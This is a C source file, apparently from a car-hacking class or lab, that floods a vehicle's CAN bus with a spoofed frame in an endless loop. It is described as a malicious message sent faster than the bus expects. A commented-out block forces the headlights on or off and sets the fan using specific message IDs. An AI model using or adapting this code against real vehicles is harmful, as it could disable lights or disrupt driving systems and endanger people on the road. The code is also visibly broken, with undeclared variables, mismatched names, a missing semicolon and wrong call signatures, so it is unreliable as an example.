/*
 * File will need to be edited since there's a new car now!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <net/if.h>
#include <sys/ioctl.h>

#include <can.h>
#include "lib.h"

void attacks(void);

int main() {

    attacks();
    return 0;
}

// Function used to send a buffer of bytes to the CAN bus
//
// Refer to https://web.eecs.umich.edu/~pmchen/eecs482/socketProgramming.pdf
// if you have any questions about socket programming.
int send(char* buff, int &s){
	struct can_frame frame;
	int nbytes;

	// parse buffer into can frame 
	if (parse_canframe(buff, &frame)){
		perror("parse");
		return 1;
	}
    
    // Write buffer to address (CAN bus)
    if((nbytes = sendto(s, &frame, sizeof(struct can_frame),
                    0, (struct sockaddr*)&addr, sizeof(addr)))){
    	perror("write");
    	return 1;
    }

    return 0;
}

// Attack function for CAN bus attacks
// Hex values passed to buffers will need to be edited in order
// to work with the new car.
void attacks(void){
	
	int s; 
	struct sockaddr_can addr;
	struct ifreq ifr;

	// open socket 
	if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0) {
		perror("can't open socket");
		close(s);
		exit(1);
	}

	strncpy(ifr.ifr_name, "can0", IFNAMSIZ - 1);
	if (ioctl(s, SIOCGIFINDEX, &ifr) < 0) {
		perror("SIOCGIFINDEX");
		close(s);
		exit(1);
	}
	addr.can_ifindex = ifr.ifr_ifindex;
	addr.can_family = AF_CAN;

	setsockopt(s, SOL_CAN_RAW, CAN_RAW_FILTER, NULL, 0);

	if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		perror("can't bind socket");
		close(s);
		exit(1);
	}

	char* buf = "3BB#4000000000000000" // Will need to be changed
		
	// Send malicious message at a rate faster than the CAN bus expects
	while(1)
		{
			if(send(buff, s)){
				break;
			}

		}

	close(s);
}


			/*
			printf("\n up/down for headlights, left/right for fan");
			if(down == 0){
				//Force headlights off
				while(1){
					unsigned char message[8] = {0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(send(0x3BB, message))
						//lcd.printf("Force headlights off");
					    fprintf("Force headlight off");
					else{
						//lcd.printf("Can't send message FHOf");
						fprintf("Can't send message FHOf");
						break;
					}
					wait(0.1);
					if(down == 0)
						break;
				}
			}
			if(right == 0){
				//Set fan to max
				while(1){
					unsigned char message[8] = {0x00, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00};
					if(send(0x356, message))
						lcd.printf("Fan to max");
					else{
						lcd.printf("Can't send message fan max");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(left == 0){
				//Set fan to min
				while(1){
					unsigned char message[8] = {0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00};
					if(send(0x356, message))
						lcd.printf("Fan to min");
					else{
						lcd.printf("Can't send message fan min");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}				
			if(up == 0){
				//Force headlights on
				while(1){
					unsigned char message[8] = {0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
					if(send(0x3BB, message))
						lcd.printf("Force headlights on");
					else{
						lcd.printf("Can't send message FHO");
						break;
					}
					wait(0.1);
					if(right == 0)
						break;
					}
				}
			if(click == 0)
				break;
			*/
